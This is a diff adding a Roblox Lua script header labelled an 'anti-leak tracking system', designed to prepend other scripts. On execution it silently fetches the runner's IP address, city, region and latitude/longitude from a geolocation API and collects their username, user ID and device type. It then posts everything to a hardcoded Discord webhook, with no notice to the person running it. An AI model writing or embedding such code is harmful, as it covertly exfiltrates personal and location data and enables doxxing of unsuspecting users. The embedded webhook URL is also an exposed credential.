@@ -1,0 +1,167 @@
+-- ============================================
+-- ANTI-LEAK TRACKING SYSTEM v2.0
+-- Auto-identifies script execution
+-- ============================================
+
+local Player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local Camera = workspace.CurrentCamera
+
+-- WEBHOOK URL
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1472640186616647838/LDFNMg2TCfgxqV1L3KhhWG2kLb4vsEqXutnmh23sWMgKVqG1zZJ9GuVRmJbvEH2hceVp"
+
+-- Function to detect device type
+local function GetDeviceType()
+    local touchEnabled = UserInputService.TouchEnabled
+    local mouseEnabled = UserInputService.MouseEnabled
+    local keyboardEnabled = UserInputService.KeyboardEnabled
+    local gamepadEnabled = UserInputService.GamepadEnabled
+    
+    local screenSize = Camera.ViewportSize
+    local diagonal = math.sqrt(screenSize.X^2 + screenSize.Y^2)
+    
+    if gamepadEnabled and not keyboardEnabled and not mouseEnabled then
+        return "Console"
+    elseif touchEnabled and not keyboardEnabled and not mouseEnabled then
+        if diagonal < 1000 then
+            return "Mobile Phone"
+        else
+            return "Tablet"
+        end
+    elseif keyboardEnabled and mouseEnabled then
+        return "Computer"
+    elseif touchEnabled and keyboardEnabled then
+        return "Laptop/2-in-1"
+    else
+        return "Unknown Device"
+    end
+end
+
+-- Function to get geographic location and IP
+local function GetLocationAndIP()
+    local success, result = pcall(function()
+        local response = request({
+            Url = "http://ip-api.com/json/",
+            Method = "GET"
+        })
+        
+        if response.StatusCode == 200 then
+            local data = HttpService:JSONDecode(response.Body)
+            if data.status == "success" then
+                return {
+                    ip = data.query or "Unknown IP",
+                    fullLocation = (data.city or "Unknown City") .. ", " .. (data.country or "Unknown Country"),
+                    region = data.regionName or "Unknown Region",
+                    lat = data.lat or 0,
+                    lon = data.lon or 0
+                }
+            end
+        end
+        return {
+            ip = "Unknown IP",
+            fullLocation = "Unknown Location",
+            region = "Unknown Region",
+            lat = 0,
+            lon = 0
+        }
+    end)
+    
+    return success and result or {
+        ip = "IP Unavailable",
+        fullLocation = "Location Unavailable",
+        region = "Region Unavailable",
+        lat = 0,
+        lon = 0
+    }
+end
+
+-- Main tracking function
+local function SendTrackingWebhook()
+    spawn(function()
+        pcall(function()
+            local locationData = GetLocationAndIP()
+            local deviceType = GetDeviceType()
+            
+            local data = {
+                ["content"] = "",
+                ["embeds"] = {{
+                    ["title"] = "Script Execution Detected",
+                    ["color"] = 15158332,
+                    ["fields"] = {
+                        {
+                            ["name"] = "Username",
+                            ["value"] = Player.Name,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Display Name",
+                            ["value"] = Player.DisplayName,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "User ID",
+                            ["value"] = tostring(Player.UserId),
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "IP Address",
+                            ["value"] = "```" .. locationData.ip .. "```",
+                            ["inline"] = false
+                        },
+                        {
+                            ["name"] = "Full Location",
+                            ["value"] = locationData.fullLocation,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Regional Location",
+                            ["value"] = locationData.region,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Device Type",
+                            ["value"] = deviceType,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Coordinates",
+                            ["value"] = "Lat: " .. locationData.lat .. ", Lon: " .. locationData.lon,
+                            ["inline"] = false
+                        },
+                        {
+                            ["name"] = "Timestamp",
+                            ["value"] = os.date("%Y-%m-%d at %H:%M:%S"),
+                            ["inline"] = false
+                        }
+                    },
+                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
+                    ["thumbnail"] = {
+                        ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(Player.UserId) .. "&width=420&height=420&format=png"
+                    },
+                    ["image"] = {
+                        ["url"] = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. tostring(Player.UserId) .. "&width=420&height=420&format=png"
+                    }
+                }}
+            }
+            
+            local jsonData = HttpService:JSONEncode(data)
+            
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+        end)
+    end)
+end
+
+-- AUTO-EXECUTE: Tracks immediately when script runs
+SendTrackingWebhook()
+
+-- ============================================
+-- YOUR SCRIPT CODE STARTS BELOW
+-- ============================================
